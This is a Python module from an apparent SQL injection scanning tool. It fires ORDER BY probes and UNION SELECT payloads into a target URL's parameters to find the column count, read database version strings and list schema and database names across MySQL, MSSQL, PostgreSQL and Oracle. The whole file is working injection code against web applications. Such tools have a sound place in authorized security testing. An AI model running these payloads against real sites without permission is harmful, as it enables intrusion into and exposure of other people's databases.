#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Union-based SQL injection detection
"""

import re
from ..utils.http_utils import inject_payload_in_url
from ..utils.cli import print_status


class UnionBasedDetector:
    """Class to detect union-based SQL injections"""

    def __init__(self, url, request_handler, logger, vuln_logger=None):
        """
        Initialize union-based detector

        Args:
            url (str): Target URL
            request_handler (RequestHandler): HTTP request handler instance
            logger (logging.Logger): Logger instance
            vuln_logger (VulnerabilityLogger, optional): Vulnerability logger
        """
        self.url = url
        self.request_handler = request_handler
        self.logger = logger
        self.vuln_logger = vuln_logger

        # Regular expressions to detect UNION-based injections
        # Looking for patterns like 1,2,3,4,5 in the response
        self.injection_patterns = [
            # Numbers pattern (matches sequences like 1,2,3 or 1 2 3)
            re.compile(r'(\d+)[\s,]+(\d+)[\s,]+(\d+)', re.IGNORECASE),

            # Version strings for various databases
            re.compile(
                r'(MySQL|MariaDB)[\s\-\_]+(\d+\.\d+\.\d+)', re.IGNORECASE),
            re.compile(
                r'(SQL\s*Server|MSSQL)[\s\-\_]+(\d+\.\d+\.\d+)', re.IGNORECASE),
            re.compile(r'(PostgreSQL)[\s\-\_]+(\d+\.\d+)', re.IGNORECASE),
            re.compile(
                r'(Oracle Database)[\s\-\_]+(\d+\.\d+\.\d+)', re.IGNORECASE),
            re.compile(r'(SQLite)[\s\-\_]+(\d+\.\d+\.\d+)', re.IGNORECASE)
        ]

    def detect_injection_in_response(self, response_text):
        """
        Detect injection patterns in response text

        Args:
            response_text (str): HTTP response text

        Returns:
            tuple: (bool, str) - (is_vulnerable, matched_text)
        """
        for pattern in self.injection_patterns:
            match = pattern.search(response_text)
            if match:
                return True, match.group(0)

        return False, None

    def determine_column_count(self, parameter, max_columns=20, is_post=False, data=None):
        """
        Determine the number of columns in a table

        Args:
            parameter (str): Parameter name to test
            max_columns (int): Maximum number of columns to test
            is_post (bool): Whether to test POST parameter
            data (dict, optional): POST data

        Returns:
            int: Number of columns or 0 if not detected
        """
        self.logger.info(
            f"Determining column count for parameter '{parameter}'")

        for i in range(1, max_columns + 1):
            # Create ORDER BY payload
            order_by_payload = f"' ORDER BY {i}--"

            try:
                if is_post:
                    # Modify POST data
                    test_data = data.copy()
                    test_data[parameter] = order_by_payload

                    # Send POST request
                    response = self.request_handler.post(
                        self.url, data=test_data)
                else:
                    # Inject payload into URL parameter
                    test_url = inject_payload_in_url(
                        self.url, parameter, order_by_payload)

                    # Send GET request
                    response = self.request_handler.get(test_url)

                # Check if response indicates an error
                # If ORDER BY n+1 causes an error, then there are n columns
                if any(error in response.text.lower() for error in [
                    "unknown column", "order by", "sqlstate", "odbc driver",
                        "syntax error", "unclosed quotation", "error"]):
                    self.logger.info(f"Found column count: {i-1}")
                    return i - 1

            except Exception as e:
                self.logger.error(f"Error testing column count {i}: {str(e)}")
                continue

        self.logger.warning(
            "Could not determine column count, using default of 1")
        return 1

    def generate_union_payloads(self, column_count):
        """
        Generate UNION-based payloads for the determined column count

        Args:
            column_count (int): Number of columns

        Returns:
            list: List of UNION-based payloads
        """
        payloads = []

        # Generate different combinations of payloads
        # Basic number sequence
        payloads.append(
            f"' UNION SELECT {','.join(str(i) for i in range(1, column_count + 1))}--")

        # NULL placeholders with database version in different positions
        for i in range(1, column_count + 1):
            columns = ["NULL"] * column_count
            columns[i-1] = "@@version"  # MySQL/MSSQL version
            payloads.append(f"' UNION SELECT {','.join(columns)}--")

            columns = ["NULL"] * column_count
            columns[i-1] = "version()"  # PostgreSQL version
            payloads.append(f"' UNION SELECT {','.join(columns)}--")

            if column_count >= 2:
                columns = ["NULL"] * column_count
                columns[i-1] = "banner"
                # Oracle version
                payloads.append(
                    f"' UNION SELECT {','.join(columns)} FROM v$version--")

        # Database specific payloads
        # MySQL
        payloads.append(
            f"' UNION SELECT {','.join('schema_name' if i == 1 else 'NULL' for i in range(1, column_count + 1))} FROM information_schema.schemata--")

        # MSSQL
        payloads.append(
            f"' UNION SELECT {','.join('name' if i == 1 else 'NULL' for i in range(1, column_count + 1))} FROM master..sysdatabases--")

        # PostgreSQL
        payloads.append(
            f"' UNION SELECT {','.join('datname' if i == 1 else 'NULL' for i in range(1, column_count + 1))} FROM pg_database--")

        return payloads

    def scan_parameter(self, parameter, is_post=False, data=None):
        """
        Scan a parameter for union-based SQL injection

        Args:
            parameter (str): Parameter name to test
            is_post (bool): Whether to test POST parameter
            data (dict, optional): POST data

        Returns:
            tuple: (bool, str, str) - (is_vulnerable, database_type, payload)
        """
        self.logger.info(
            f"Testing parameter '{parameter}' for union-based SQL injection")

        # Determine column count
        column_count = self.determine_column_count(
            parameter, is_post=is_post, data=data)

        # Generate payloads based on column count
        payloads = self.generate_union_payloads(column_count)

        # Test each payload
        for payload in payloads:
            try:
                if is_post:
                    # Modify POST data
                    test_data = data.copy()
                    test_data[parameter] = payload

                    # Send POST request
                    response = self.request_handler.post(
                        self.url, data=test_data)
                else:
                    # Inject payload into URL parameter
                    test_url = inject_payload_in_url(
                        self.url, parameter, payload)

                    # Send GET request
                    response = self.request_handler.get(test_url)

                # Check if response indicates successful injection
                is_vulnerable, matched_text = self.detect_injection_in_response(
                    response.text)

                if is_vulnerable:
                    # Determine database type from the payload and response
                    db_type = "Unknown"

                    if "@@version" in payload and ("MySQL" in response.text or "MariaDB" in response.text):
                        db_type = "MySQL"
                    elif "@@version" in payload and "SQL Server" in response.text:
                        db_type = "MSSQL"
                    elif "version()" in payload and "PostgreSQL" in response.text:
                        db_type = "PostgreSQL"
                    elif "v$version" in payload and "Oracle" in response.text:
                        db_type = "Oracle"
                    elif "sqlite_version()" in payload and "SQLite" in response.text:
                        db_type = "SQLite"
                    elif "information_schema" in payload:
                        db_type = "MySQL"
                    elif "sysdatabases" in payload:
                        db_type = "MSSQL"
                    elif "pg_database" in payload:
                        db_type = "PostgreSQL"

                    # Log vulnerability
                    print_status(
                        f"Parameter '{parameter}' is vulnerable to union-based SQL injection", "vuln")
                    print_status(f"Database type: {db_type}", "info")
                    print_status(f"Payload: {payload}", "info")
                    print_status(f"Matched text: {matched_text}", "info")

                    self.logger.warning(
                        f"Found union-based SQL injection in parameter '{parameter}' with payload: {payload}")

                    if self.vuln_logger:
                        self.vuln_logger.add_vulnerability(
                            url=self.url,
                            injection_type="Union-based",
                            parameter=parameter,
                            payload=payload,
                            database_type=db_type,
                            details={"column_count": column_count,
                                     "matched_text": matched_text}
                        )

                    return True, db_type, payload

            except Exception as e:
                self.logger.error(f"Error testing payload {payload}: {str(e)}")
                continue

        print_status(
            f"Parameter '{parameter}' is not vulnerable to union-based SQL injection", "info")
        self.logger.info(
            f"No union-based SQL injection found in parameter '{parameter}'")

        return False, None, None
